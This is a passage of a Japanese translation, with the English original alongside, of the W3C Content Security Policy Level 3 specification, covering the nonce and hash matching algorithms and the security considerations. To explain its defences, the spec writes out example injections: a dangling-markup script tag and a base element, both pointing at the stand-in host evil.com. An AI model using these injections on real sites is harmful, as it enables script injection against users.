		</ol>
	</li>
	<li>
<p>
~IF［
%要素 を~token化したときに
<a href="~HTMLparsing#parse-error-duplicate-attribute">duplicate-attribute 構文解析-~error</a><!-- ＊ -->
が生じている
］
⇒
~RET `~nonce可能でない^i
◎
If element had a duplicate-attribute parse error during tokenization, return "Not Nonceable".
</p>

<p class="issue">
この~errorを記録するための 何らかの類の~hookが~HTML内に必要である
— それをここで用いるのを計画しているならば。
<a href="~HTMLissue/3257">&lt;~HTMLissue/3257&gt;</a>
◎
We need some sort of hook in HTML to record this error if we’re planning on using it here. &lt;https://github.com/whatwg/html/issues/3257&gt;
</p>
	</li>
	<li>
~RET `~nonce可能^i
◎
Return "Nonceable".
</li>
</ol>


<p class="issue">
この処理には、既存の要素から~nonceを盗用して 注入する~scriptを読込ませるような，~dangling-markup攻撃の~riskを軽減することが~~意図されている。
しかしながら、~scriptを実行すべきかどうか決定するときに，すべての属性と その値を走査するぶん，高価でもある。
ここでは、この検査を，要素が~nonceを有していて `script$e 要素であるときに限り走査することにより，その影響0をできるだけ抑えようとしているが、その影響0を知るまでは，この~algoは “~risk下にある” ものと見なすべきであろう。
`98$Issue
◎
This processing is meant to mitigate the risk of dangling markup attacks that steal the nonce from an existing element in order to load injected script. It is fairly expensive, however, as it requires that we walk through all attributes and their values in order to determine whether the script should execute. Here, we try to minimize the impact by doing this check only for script elements when a nonce is present, but we should probably consider this algorithm as "at risk" until we know its impact. &lt;https://github.com/w3c/webappsec-csp/issues/98&gt;
</p>

				</section>
				<section id="allow-all-inline">
<h5 title="Does a source list allow all inline behavior for type?">6.6.2.2. %~source~list は %型 に対するすべての~inlineの挙動を許容するか？</h5>

<p>
`~source~list$は、次を満たすならば，所与の %型 に対する
`すべての~inlineの挙動を許容する@
とされる
⇒
`keyword-source$p 式 `unsafe-inline^pl を包含する, かつ
— 次の~algoにて述べるように —
その式を上書きしない
◎
A source list allows all inline behavior of a given type if it contains the keyword-source expression 'unsafe-inline', and does not override that expression as described in the following algorithm:
</p>

<p>
次の~algoは、所与の
( `~source~list$ %~list, 文字列 %型 )
に対し，［
%型 の~inline内容すべてが許容されるならば
`許容s^i ／
~ELSE_ `非許容^i
］を返す：
◎
Given a source list (list) and a string (type), the following algorithm returns "Allows" if all inline content of a given type is allowed and "Does Not Allow" otherwise.
</p>

<ol>
	<li>
%すべての~inlineを許容する ~LET ~F
◎
Let allow all inline be false.
</li>
	<li>
<p>
%~list 内の
~EACH( %式 )
に対し：
◎
For each expression in list:
</p>
		<ol>
			<li>
~IF［
%式 は［
`nonce-source$p ／ `hash-source$p
］文法に合致する
］
⇒
~RET `非許容^i
◎
If expression matches the nonce-source or hash-source grammar, return "Does Not Allow".
</li>
			<li>
<p>
~IF［
%型 ~IN { `script^l, `script attribute^l, `navigation^l }
］~AND［
%式 ~EQ `strict-dynamic$pl
］
⇒
~RET `非許容^i
◎
If type is "script", "script attribute" or "navigation" and expression matches the keyword-source "'strict-dynamic'", return "Does Not Allow".
</p>

<p class="note">注記：
`strict-dynamic$pl が適用される資源~型は~scriptに限られる。
詳細は、~strict-dynamic-usageに。
◎
Note: 'strict-dynamic' only applies to scripts, not other resource types. Usage is explained in more detail in §8.2 Usage of "'strict-dynamic'".
</p>
			</li>
			<li>
~IF［
%式 ~EQ`~ACI$ `unsafe-inline$pl
］
⇒
%すべての~inlineを許容する ~SET ~T
◎
If expression is an ASCII case-insensitive match for the keyword-source "'unsafe-inline'", set allow all inline to true.
</li>
		</ol>
	<li>
~RET ［
%すべての~inlineを許容する ~EQ ~T ならば `許容s^i ／
~ELSE_ `非許容^i
］
◎
If allow all inline is true, return "Allows". Otherwise, return "Does Not Allow".
</li>
</ol>

<p class="trans-note">【
`非許容^i の意味論が， “すべてを許容する” の論理的な［
裏（ “すべてを許容しない” ）／ 否定（ “許容しないものがある” ）
］のいずれを表すのか、はっきりしない。
】【
“すべて” が［
“~inline”, “挙動”
］のどちらにかかるのか、はっきりしない。
】</p>


<div class="example">

<p>
次の`~source~list$は、`すべての~inlineの挙動を許容する$
◎
Source lists that allow all inline behavior:
</p>

<pre class="http-code">
'unsafe-inline' http://a.com http://b.com
'unsafe-inline'
</pre>

<p>
次の`~source~list$は、
~nonce／~hashが在すること, または
`unsafe-inline^pl の不在に因り
`すべての~inlineの挙動を許容する$ことはない：
◎
Source lists that do not allow all inline behavior due to the presence of nonces and/or hashes, or absence of 'unsafe-inline':
</p>

<pre class="http-code">
'sha512-321cba' 'nonce-abc'
http://example.com 'unsafe-inline' 'nonce-abc'
</pre>

<p>
次の`~source~list$は、
%型 ~IN { `script^pl, `script attribute^pl }
のときは， `strict-dynamic^pl が在することに因り
`すべての~inlineの挙動を許容する$ことはないが、他の場合は
`すべての~inlineの挙動を許容する$：
◎
Source lists that do not allow all inline behavior when type is 'script' or 'script attribute' due to the presence of 'strict-dynamic', but allow all inline behavior otherwise:
</p>


<pre class="http-code">
'unsafe-inline' 'strict-dynamic'
http://example.com 'strict-dynamic' 'unsafe-inline'
</pre>

</div>

				</section>
				<section id="match-element-to-source-list">
<h5 title="Does element match source list for type and source?">6.6.2.3. %要素 は ( %型, %~source ) について %~source~list に合致するか？</h5>

<p>
次の~algoは、
( `要素$ %要素, `~source~list$ %~list, 文字列 %型, 文字列 %~source )
が与えられた下で，［
`合致es^i または `非合致^i
］を返す：
◎
Given an Element (element), a source list (list), a string (type), and a string (source), this algorithm returns "Matches" or "Does Not Match".
</p>

<p class="note">注記：
%~source は、自身が埋込まれる~pageの符号化法で解釈されることになる。
詳細は、`~HTMLとの統合$ 節における統合~点を見よ。
◎
Note: source will be interpreted with the encoding of the page in which it is embedded. See the integration points in §4.2 Integration with HTML for more detail.
</p>

<ol>
	<li>
~IF［
`~source~listは型に対するすべての~inlineの挙動を許容するか？$A( %~list, %型 )
の結果 ~EQ `許容s^i
］
⇒
~RET `合致es^i
◎
If §6.6.2.2 Does a source list allow all inline behavior for type? returns "Allows" given list and type, return "Matches".
</li>
	<li>
<p>
~IF［
%型 ~IN { `script^l, `style^l }
］~AND［
`要素は~nonce可能か？$A( %要素 ) ~EQ `~nonce可能^i 
］：
◎
If type is "script" or "style", and §6.6.2.1 Is element nonceable? returns "Nonceable" when executed upon element:
</p>
		<ol>
			<li>
<p>
%~list 内の
~EACH( %式 )
に対し：
◎
For each expression in list:
</p>
				<ol>
					<li>
~IF［
%式 は `nonce-source$p 文法に合致する
］~AND［
%要素 は `nonce$a 属性を有していて［
その値 ~EQ %式 の `base64-value$p 成分
］］
⇒
~RET `合致es^i
◎
If expression matches the nonce-source grammar, and element has a nonce attribute whose value is a case-sensitive match for expression’s base64-value part, return "Matches".
</li>
				</ol>
<p class="note">注記：
~nonceが適用されるのは、~inline［
`script$e ／ `style$e
］要素であり，これらの要素の属性でも `javascript_^sc ~naviでもない。
◎
Note: Nonces only apply to inline script and inline style, not to attributes of either element or to javascript: navigations.
</p>
			</li>
		</ol>
	</li>
	<li>
%非安全~hash~flag ~LET ~F
◎
Let unsafe-hashes flag be false.
</li>
	<li>
<p>
%~list 内の
~EACH( %式 )
に対し：
◎
For each expression in list:
</p>
		<ol>
			<li>
~IF［
%式 ~EQ`~ACI$ `unsafe-hashes$pl
］
⇒＃
%非安全~hash~flag ~SET ~T；
~BREAK
◎
If expression is an ASCII case-insensitive match for the keyword-source "'unsafe-hashes'", set unsafe-hashes flag to true. Break out of the loop.
</li>
		</ol>
	</li>
	<li>
<p>
~IF［
%型 ~IN { `script^l, `style^l }
］~OR［
%非安全~hash~flag ~EQ ~T
］：
◎
If type is "script" or "style", or unsafe-hashes flag is true:
</p>

		<ol>
			<li>
<p>
%~list 内の
~EACH( %式 )
に対し：
◎
For each expression in list:
</p>
				<ol>
					<li>
~IF［
%式 は `hash-source$p 文法に合致しない
］
⇒
~CONTINUE
◎
If expression matches the hash-source grammar:
</li>
					<li>
%~algo ~LET ［
`~ASCII小文字~化する$( %式 の`hash-algorithm$p 成分 ) の結果
］に応じて，次で与えられる~algo `SHA2$r
⇒
`sha256^l ならば SHA-256 ／
`sha384^l ならば SHA-384 ／
`sha512^l ならば SHA-512 ／
~ELSE_ ~NULL
◎
Let algorithm be null.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha256", set algorithm to SHA-256.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha384", set algorithm to SHA-384.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha512", set algorithm to SHA-512.
</li>
					<li>
~IF［
%~algo ~EQ ~NULL
］
⇒
~CONTINUE
◎
If algorithm is not null:
</li>
					<li>
<p>
~IF［
次の 2 つは同じである
］…：
</p>

<ul ><li>%~source に %~algo を適用した結果を `base64$p に符号化した結果（実際の値）
</li><li>%式 の `base64-value$p 成分を，その中の各~文字［
`-^l ／ `_^l
］を［
`+^l ／ `/^l
］に置換した結果（期待される値）
</li></ul>

<p>
…ならば
⇒
~RET `合致es^i
</p>

<p class="note">注記：
この置換は、
`base64url$p に符号化された~hashを正規化して，
`base64$p 符号化-法の下で照合できるようにする。
</p>

◎
Let actual be the result of base64 encoding the result of applying algorithm to source.
◎
Let expected be expression’s base64-value part, with all '-' characters replaced with '+', and all '_' characters replaced with '/'.
◎
Note: This replacement normalizes hashes expressed in base64url encoding into base64 encoding for matching.
◎
If actual is a case-sensitive match for expected, return "Matches".
</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
~hashは、~inline［
`script$e ／ `style$e
］に適用される。
~source式 `unsafe-hashes$pl が在する場合、それも［
~event~handler ／ ~style属性 ／ `javascript_^sc ~navi
］に適用される。
◎
Note: Hashes apply to inline script and inline style. If the "'unsafe-hashes'" source expression is present, they will also apply to event handlers, style attributes and javascript: navigations.
</p>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>


				</section>
			</section>
		</section>
	</section>
	<section id="security-considerations">
<h2 title="Security and Privacy Considerations">7. 保安と~privacy上の考慮点</h2>

		<section id="security-nonces">
<h3 title="Nonce Reuse">7.1. ~nonceの再利用-</h3>

<p>
~nonceは、それが送達された指令~内に在する他の制約を，上書きする。
ゆえに、推測-不能であり続けることが不可欠になる
— さもなければ、資源の施策を迂回することは，自明になるので。
◎
Nonces override the other restrictions present in the directive in which they’re delivered. It is critical, then, that they remain unguessable, as bypassing a resource’s policy is otherwise trivial.
</p>

<p>
`施策$の一部として
`nonce-source$p 式を送達する~serverは、施策の各~伝送-ごとに一意な値を生成し~MUST。
生成される値は、攻撃者による予測-が困難になる~SHOULDであり，［
（符号化する前の時点で） 128 ~bit以上
］, かつ［
暗号的に保安的な乱数生成器を介して生成される
］~SHOULDである。
◎
If a server delivers a nonce-source expression as part of a policy, the server MUST generate a unique value each time it transmits a policy. The generated value SHOULD be at least 128 bits long (before encoding), and SHOULD be generated via a cryptographically secure random number generator in order to ensure that the value is difficult for an attacker to predict.
</p>

<p class="note">注記：
【 `script-src$dir／`style-src$dir 指令において】
~nonceを利用して~inline［
~script／~style
］を許容するのは、~nonceを利用しないでそうするときより保安的でない
— ~nonceは、それが在する指令~内の制約を上書きするので。
~nonceへの~accessを得られる攻撃者は、~~任意の~scriptを~~任意に実行できる。
とは言え、古い~code上に~CSP層を重ねるとき，~nonceの利用は `unsafe-inline$pl を大きく改善する。
作者には、 `unsafe-inline$pl を検討するときは，代わりに~nonce（または~hash）を検討することが奨励される。
◎
Note: Using a nonce to allow inline script or style is less secure than not using a nonce, as nonces override the restrictions in the directive in which they are present. An attacker who can gain access to the nonce can execute whatever script they like, whenever they like. That said, nonces provide a substantial improvement over 'unsafe-inline' when layering a content security policy on top of old code. When considering 'unsafe-inline', authors are encouraged to consider nonces (or hashes) instead.
</p>

		</section>
		<section id="security-nonce-stealing">
<h3 title="Nonce Stealing">7.2. ~nonceの盗用</h3>

<p>
`FILEDESCRIPTOR-2015$r などで論じられている，~dangling-markup攻撃（ `dangling markup attack^en ）は、~pageの正当な~nonceを注入-用に転用するためにも利用され得る。
例えば、所与の `script$e 要素の前に注入~地点があるとする：
◎
Dangling markup attacks such as those discussed in [FILEDESCRIPTOR-2015] can be used to repurpose a page’s legitimate nonces for injections. For example, given an injection point before a script element:
</p>


<pre class="html-code">
&lt;p&gt;Hello, %注入~地点&lt;/p&gt;
&lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
</pre>
<!-- 
INJECTION POINT
-->
<p>
攻撃者が文字列 `&lt;script src='https://evil.com/evil.js' ^l を注入した場合、~browserは次を受信することになる：
◎
If an attacker injects the string "&lt;script src='https://evil.com/evil.js' ", then the browser will receive the following:
</p>

<pre class="html-code">
&lt;p&gt;Hello, <mark>&lt;script src='https://evil.com/evil.js' </mark>&lt;/p&gt;
&lt;script nonce=abc <mark>src=/good.js</mark>&gt;&lt;/script&gt;
</pre>


<p>
その~codeを構文解析した結果の `script$e 要素には、次に挙げる名前の属性：
<span class="block">
`src^l , `&lt;/p&gt;^l , `&lt;script^l , `nonce^l, もう一つの `src^l
</span>
が伴われることになる。
最初の `src^a 属性
— 悪意的な~sourceを指している —
のおかげで、元からあった 2 番目の `src^a 属性は，構文解析器により重複として破棄される。
◎
It will then parse that code, ending up with a script element with a src attribute pointing to a malicious payload, an attribute named &lt;/p&gt;, an attribute named "&lt;script", a nonce attribute, and a second src attribute which is helpfully discarded as duplicate by the parser.
</p>

<p>
`要素は~nonce可能か？$A
~algoは、［
`script$e, `style$e
］要素の属性を走査して，その名前や値から文字列［
`&lt;script^l ／ `&lt;style^l
］を探し出すことで、この特定の攻撃を軽減しようと試みるものである。
◎
The §6.6.2.1 Is element nonceable? algorithm attempts to mitigate this specific attack by walking through script or style element attributes, looking for the string "&lt;script" or "&lt;style" in their names or values.
</p>

		</section>
		<section id="security-nonce-retargeting">
<h3 title="Nonce Retargeting">7.3. ~nonceの再~target法</h3>

<p>
~nonceは、 `host-source$p 式を迂回して，開発者がどの生成元からも~codeを読込めるようにする。
これは一般に，開発者の視点からは~~好都合になるが、攻撃者が `base$e 要素を注入できる場合、さもなければ安全だった~pageは，相対~URLの解決-時に打破され得る。
すなわち，
`https://example.com/^s
上の~code：
◎
Nonces bypass host-source expressions, enabling developers to load code from any origin. This, generally, is fine, and desirable from the developer’s perspective. However, if an attacker can inject a base element, then an otherwise safe page can be subverted when relative URLs are resolved. That is, on https://example.com/ the following code will load https://example.com/good.js:
</p>

<pre class="html-code">
&lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
</pre>

<p>
は，
`https://example.com/good.js^s
を読込むことになるが、次の~codeは，
`https://evil.com/good.js^s
を読込むことになる：
◎
However, the following will load https://evil.com/good.js:
</p>

<pre class="html-code">
&lt;base href="https://evil.com"&gt;
&lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
</pre>

<p>
この~riskを軽減するため、あらゆる~pageに明示的な `base$e 要素を設定するか，または、~pageの施策に `base-uri$dir 指令
— 例えば
<samp >`base-uri$p `none^pl</samp>
—
を設定して，攻撃者が自前の `base$e 要素を注入する能を制限することを勧める。
◎
To mitigate this risk, it is advisable to set an explicit base element on every page, or to limit the ability of an attacker to inject their own base element by setting a base-uri directive in your page’s policy. For example, base-uri 'none'.
</p>
		</section>
		<section id="security-css-parsing">
<h3 title="CSS Parsing">7.4. ~CSS構文解析</h3>

<p>
`style-src$dir 指令は、［
被保護~資源が，~styleをどの所在から読込めるか
］を制約する。
しかしながら，~UAの~CSS構文解析~algoが緩い場合、攻撃者は，信用できない生成元に~hostされている悪意的な “~stylesheet” を受容するように ~UAを騙せるかもしれない。
◎
The style-src directive restricts the locations from which the protected resource can load styles. However, if the user agent uses a lax CSS parsing algorithm, an attacker might be able to trick the user agent into accepting malicious "stylesheets" hosted by an otherwise trustworthy origin.
</p>

<p>
これらの攻撃は、
2009 年に Chris Evans 氏が述べた，~CSS非同一生成元~data漏洩~攻撃 `CSS-ABUSE$r
に類似するものである。
いずれの攻撃に対しても、~UAは，同じ仕組み
— ~MIME型が不適正な~stylesheetに対しては，より厳格な~CSS構文解析~規則を適用する —
で防御する~SHOULDである：
◎
These attacks are similar to the CSS cross-origin data leakage attack described by Chris Evans in 2009 [CSS-ABUSE]. User agents SHOULD defend against both attacks using the same mechanism: stricter CSS parsing rules for style sheets with improper MIME types.
</p>

		</section>
		<section id="security-violation-reports">
<h3 title="Violation Reports">7.5. 違反~報告</h3>

<p>
この文書における違反~報告-法の仕組みは、［
悪意的な~web~siteが，違反~報告を利用して，他の~serverの挙動を探査する~risk
］を軽減するように設計されている。
例えば，画像の~sourceとして
`https://example.com^s
を許容している，悪意的な~web~siteを考える。
この~siteが、【 example.com の~log-in用~pageの~URLである】
`https://example.com/login^s
を画像として読込もうと試みた場合、
`example.com^s の~serverが，ある identity provider†（例えば
`identityprovider.example.net^s
とする）へ~redirectしたとするとき、~CSPにより，その要請は阻止されることになる。
仮に、阻止された~URLを，違反~報告に全部的に包含することにした場合、違反~報告に，~redirect先の~URL内に［
~session識別子や purported identities††などの敏感な情報
］が包含されていれば，それも包含することになる。
この理由から、~UAは，~redirect~targetではなく 元の要請の~URLを違反~報告に含むようにしている。
◎
The violation reporting mechanism in this document has been designed to mitigate the risk that a malicious web site could use violation reports to probe the behavior of other servers. For example, consider a malicious web site that allows https://example.com as a source of images. If the malicious site attempts to load https://example.com/login as an image, and the example.com server redirects to an identity provider (e.g. identityprovider.example.net), CSP will block the request. If violation reports contained the full blocked URL, the violation report might contain sensitive information contained in the redirected URL, such as session identifiers or purported identities. For this reason, the user agent includes only the URL of the original request, not the redirect target.
</p>


<p class="trans-note">【†
“identity provider”
— <abbr>IdP</abbr> とも略称される，個人認証サービスを専門に供するプロバイダを指すものと見られる。
】【††
“purported identities（ある特定目的の識別情報）”
— 現実の個人の識別-は含意しないような，（当の~site~~専用の）異なる個人を別人として識別する類の情報と見られる。
】</p>

<p>
違反~報告は、攻撃者により制御される~dataと見なされるべきである。
開発者は，~dashboardに類する~service内に違反~報告を収集したいと望むときは、内容を具現化する前に，適正に~escapeするよう注意深くなるべきである（また，おそらく、注入の~riskを更に軽減するため，それ自体も~CSPを利用するべきである）。
このことは，とりわけ、［
違反~報告の `script-sample^l ~prop／
`SecurityPolicyViolationEvent$I の `sample$m 属性
］に該当する
— 両者とも完全に攻撃者により制御される文字列なので。
◎
Note also that violation reports should be considered attacker-controlled data. Developers who wish to collect violation reports in a dashboard or similar service should be careful to properly escape their content before rendering it (and should probably themselves use CSP to further mitigate the risk of injection). This is especially true for the "script-sample" property of violation reports, and the sample property of SecurityPolicyViolationEvent, which are both completely attacker-controlled strings.
</p>

		</section>
		<section id="source-list-paths-and-redirects">
<h3 title="Paths and Redirects">7.6. ~pathと~redirect</h3>

<p>
~path情報が（ Egor Homakov 氏により論じられた
<a href="https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html">Using Content-Security-Policy for Evil</a>
により）非同一生成元に漏洩されるのを避けるため、読込まれている資源が~redirectの結果である場合，照合~algoは ~source式を成す~path成分を無視する。
例えば，~pageにて作動中の施策として
<samp>`img-src$dir example.com example.org/path</samp>
が与えられているとする：
◎
To avoid leaking path information cross-origin (as discussed in Egor Homakov’s Using Content-Security-Policy for Evil), the matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect. For example, given a page with an active policy of img-src example.com example.org/path:
</p>

<ul>
	<li>
`https://example.org/not-path^s
を直に読込んでも、この施策には合致しないので，失敗することになる。
◎
Directly loading https://example.org/not-path would fail, as it doesn’t match the policy.
</li>
	<li>
`https://example.com/redirector^s
を直に読込んだ場合、
`example.com^s
に合致するので，合格することになる。
◎
Directly loading https://example.com/redirector would pass, as it matches example.com.
</li>
	<li>
`https://example.com/redirector^s
が
`https://example.org/not-path^s
を指している~redirect応答を送達するとする。
この場合、読込みは成功することになる
— 初期~URLは `example.com^s に合致し，~redirect~targetは その~path成分を無視すれば `example.org/path^s に合致するので。
◎
Assuming that https://example.com/redirector delivered a redirect response pointing to https://example.org/not-path, the load would succeed, as the initial URL matches example.com, and the redirect target matches example.org/path if we ignore its path component.
</li>
</ul>

<p>
この制約は、~redirectが生じることになるとき，文書の施策の細かさを抑制する。
それは、この型の総当たりによる情報~漏洩-を避けるために必要とされる妥協点である。
◎
This restriction reduces the granularity of a document’s policy when redirects are in play, a necessary compromise to avoid brute-forced information leaks of this type.
</p>

<p>
public-webappsec@w3.org
における長い~thread
<a href="https://lists.w3.org/Archives/Public/public-webappsec/2014Feb/0036.html">Remove paths from CSP?"</a>
（ “~CSPから~pathを除去するか？” ）にて，代替-提案に関する詳細が論じられている。
◎
The relatively long thread "Remove paths from CSP?" from public-webappsec@w3.org has more detailed discussion around alternate proposals.
</p>
		</section>
		<section id="security-secure-upgrades">
<h3 title="Secure Upgrades">7.7. 保安的~昇格</h3>

<p>
Yan Zhu 氏による
<a href="http://diracdeltas.github.io/sniffly/">Sniffly</a>
の様な，ある種の履歴走査~攻撃（ `history-scanning^en ）を軽減するため、~CSPは，~pageが［
`script-src http://example.com^s
の様な施策を介して，自身を非保安的~URLに~lockする
］ことは許容しない。
<a href="#match-schemes">`scheme-part^p の照合~節</a>
に述べたように、~source式の~scheme成分に対しては，常に保安的~schemeへの昇格が許容されることになる。
◎
To mitigate one variant of history-scanning attacks like Yan Zhu’s Sniffly, CSP will not allow pages to lock themselves into insecure URLs via policies like script-src http://example.com. As described in §6.6.1.7 scheme-part matching, the scheme portion of a source expression will always allow upgrading to a secure variant.
</p>

		</section>
		<section id="security-inherit-csp">
<h3 title="CSP Inheriting to avoid bypasses ">7.8. 迂回を避けるための~CSPの継承-法</h3>

<p>
［
`文書の~CSP~listを初期化する$A,
`大域~objの~CSP~listを初期化する$A
］にて述べたように、`局所~scheme$から読込まれる文書は，それを［
`埋込んでいる文書$ ／ `開いた閲覧文脈$
］の`~CSP~list$gO内の施策を複製して継承することになる。
その目標は、次を確保することである
⇒
~pageが［
次に挙げるような，自身が全体を制御できる内容
］を包含している［
~frameを埋込む ／ 新たな~windowを開く
］ことで，自身の施策を迂回することは、できない
⇒
 `document.write()^m 等々を介して操作できるような［
`~iframe-srcdoc文書$ ／
`blob_^sc ~URL ／
`data_^sc ~URL ／
`about_blank^sc 文書
］
◎
As described in §4.2.1 Initialize a Document's CSP list and §4.2.2 Initialize a global object’s CSP list, documents loaded from local schemes will inherit a copy of the policies in the CSP list of the embedding document or opener browsing context. The goal is to ensure that a page can’t bypass its policy by embedding a frame or opening a new window containing content that is entirely under its control (srcdoc documents, blob: or data: URLs, about:blank documents that can be manipulated via document.write(), etc).
</p>

<div class="example">

<p>
これが起こらなかった場合，~pageは、自身の実行~文脈~内に `unsafe-inline^pl を伴わずとも，~inline~scriptを実行できるようになる
— 単に `srcdoc^a を伴う `iframe^e を埋込むことで：
◎
If this would not happen a page could execute inline scripts even without unsafe-inline in the page’s execution context by simply embedding a srcdoc iframe.
</p>

<pre class="html-code">
&lt;iframe srcdoc="&lt;script&gt;alert(1);&lt;/script&gt;"&gt;&lt;/iframe&gt;
</pre>
</div>

<p>
［
`埋込んでいる文書$ ／ `開いた閲覧文脈$
］の`~CSP~list$gOは、複製されることに注意。
新たな`文書$の`~CSP~list$gOは，関連する施策の作成-時における~snapshotであり、一方の`~CSP~list$gOが改変されても，他方には影響しない。
◎
Note that we create a copy of the CSP list which means that the new Document's CSP list is a snapshot of the relevant policies at its creation time. Modifications in the CSP list of the new Document won’t affect the embedding document or opener browsing context’s CSP list or vice-versa.
</p>

<div class="example">

<p>
次の例の~iframeの内側にある画像は、読込まれないことになる
— それは~iframeの `meta^e ~tag内の施策により阻止されるので。
~iframeの外側にある画像は、（~~元の~pageの施策により阻止されなければ）読込まれることになる
— ~iframe内に挿入される施策は、~~元の~pageの施策には影響しないので。
◎
In the example below the image inside the iframe will not load because it is blocked by the policy in the meta tag of the iframe. The image outside the iframe will load (assuming the main page policy does not block it) since the policy inserted in the iframe will not affect it.
</p>
<pre class="html-code">
&lt;iframe srcdoc='&lt;meta
    http-equiv="Content-Security-Policy"
    content="img-src example.com;"&gt;
    &lt;img src="not-example.com/image"&gt;'
&gt;&lt;/iframe&gt;

&lt;img src="not-example.com/image"&gt;
</pre>
</div>

		</section>
	</section>
	<section id="authoring-considerations">
<h2 title="Authoring Considerations">8. 著作上の考慮点</h2>

		<section id="multiple-policies">
<h3 title="The effect of multiple policies">8.1. 複数の施策による効果</h3>

~INFORMATIVE

<p>
上の節【どの節？】では、施策が複数~在するときは、それぞれが，その型に則って［
施行-／報告-
］され~MUSTと記されている。
実施において，これがどう働くものとされるべきか、明確化する例を示す。
何らかの理由で、ある~siteから【の資源に伴って】次の HTTP ~headerが送達されてきたとする：
◎
The above sections note that when multiple policies are present, each must be enforced or reported, according to its type. An example will help clarify how that ought to work in practice. The behavior of an XMLHttpRequest might seem unclear given a site that, for whatever reason, delivered the following HTTP headers:
</p>

<div class="example">

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl http://example.com http://example.net;
    `connect-src$dir `none$pl;

`Content-Security-Policy$h:
    `connect-src$dir http://example.com/;
    `script-src$dir http://example.com/
</pre>
</div>

<p>
このとき、【この資源における】
`XMLHttpRequest$I
<!-- 
の挙動は，はっきりしないように見えるかもしれない
 -->
による
`example.com^s
への接続は許容されるか？
— 答えは、許容されない，である。
両~施策の施行は、［
起こりうる接続が，両者ともに無傷で合格しなければならない
］ことを意味する。
二番目の施策がこの接続を許容するとしても，最初の施策が
<samp>`connect-src$dir `none$pl</samp>
を包含するので、その施行により接続は阻止される。
施行する施策の~listに，施策を追加することによる影響0は、被保護~資源の能力に制約を追加しこそすれ，それを~~緩めることはない。
◎
Is a connection to example.com allowed or not? The short answer is that the connection is not allowed. Enforcing both policies means that a potential connection would have to pass through both unscathed. Even though the second policy would allow this connection, the first policy contains connect-src 'none', so its enforcement blocks the connection. The impact is that adding additional policies to the list of policies to enforce can only further restrict the capabilities of the protected resource.
</p>

<p>
更に~~説明するため、この~page上の~script~tagを考える。
最初の施策は，~scriptを `default-src$dir 指令による
{ `self$pl, `http://example.com^s, `http://example.net^s }
の枠内に絞る一方、二番目の施策は，
`http://example.com/^s
からの~scriptのみを許容する。
~scriptが読込まれるのは，両~施策の判定基準を満たす場合に限られるので、合致し得る生成元は
`http://example.com^s
のみになる。
◎
To demonstrate that further, consider a script tag on this page. The first policy would lock scripts down to 'self', http://example.com and http://example.net via the default-src directive. The second, however, would only allow script from http://example.com/. Script will only load if it meets both policy’s criteria: in this case, the only origin that can match is http://example.com, as both policies allow it.
</p>

		</section>
		<section id="strict-dynamic-usage">
<h3 title="Usage of &quot;'strict-dynamic'&quot;">8.2. `strict-dynamic^pl の用法</h3>

<p>
~hostや~pathに基づく施策を~~正しく保つことは、とりわけ CDN の様な まとまりのない生成元では，大変になる。
`<a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes">solutions to Cure53’s H5SC Minichallenge 3: "Sh*t, it’s CSP!"</a>^en
`H5SC3$r
は，そのような施策が可能化し得る迂回の好例であり、~CSPが，特定の資源たちを網羅する宣言を介して これらの迂回を軽減する能力を有するとしても、そのような~listは壊れ易く, 扱い難く, 実装する／保守するのが困難になりがちである。
◎
Host- and path-based policies are tough to get right, especially on sprawling origins like CDNs. The solutions to Cure53’s H5SC Minichallenge 3: "Sh*t, it’s CSP!" [H5SC3] are good examples of the kinds of bypasses which such policies can enable, and though CSP is capable of mitigating these bypasses via exhaustive declaration of specific resources, those lists end up being brittle, awkward, and difficult to implement and maintain.
</p>

<p>
`strict-dynamic$pl ~source式は、既存の~appが，自身が直に読込む~scriptについては自信があるが，前面に読込まれる資源の~list を適度に供する能については自信がない場合に、~CSPをより単純に配備できるようにすることを目指している。
◎
The "'strict-dynamic'" source expression aims to make Content Security Policy simpler to deploy for existing applications who have a high degree of confidence in the scripts they load directly, but low confidence in their ability to provide a reasonable list of resources to load up front.
</p>

<p>
`script-src$dir ／ `default-src$dir
指令~内に在する場合、 2 つの主な効果がある：
◎
If present in a script-src or default-src directive, it has two main effects:
</p>

<ul>
	<li>
<p>(A)：
式［
`host-source$p, `scheme-source$p
］, および `keyword-source$p［
`unsafe-inline$pl, `self$pl
］は、~scriptの読込み時には無視される。
◎
host-source and scheme-source expressions, as well as the "'unsafe-inline'" and "'self' keyword-sources will be ignored when loading script.
</p>

<p>
式［
`hash-source$p, `nonce-source$p
］は、尊守されることになる。
◎
hash-source and nonce-source expressions will be honored.
</p>
	</li>
	<li>(B)：
`構文解析-時に挿入され$たものではない `script$e 要素により誘発される~script要請は、許容される。
◎
Script requests which are triggered by non-"parser-inserted" script elements are allowed.
</li>
</ul>

<div class="p">
<p>
(A) は、後方互換な仕方で，~UAによる~~推定（ `sniffing^en ）を要することなく
`strict-dynamic$pl を配備できるようにする。
例えば施策
<samp>`unsafe-inline$pl https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' `strict-dynamic$pl</samp>
は、~browserが~supportする~CSPの~versionに応じて，次であるかの様に動作することになる：
</p>

<ul ><li>CSP1 ならば
<samp>`unsafe-inline^pl https:</samp>
</li><li>CSP2 ならば
<samp>https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'</samp>
</li><li>CSP3 ならば
<samp>'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' `strict-dynamic^pl</samp>
</li></ul>

◎
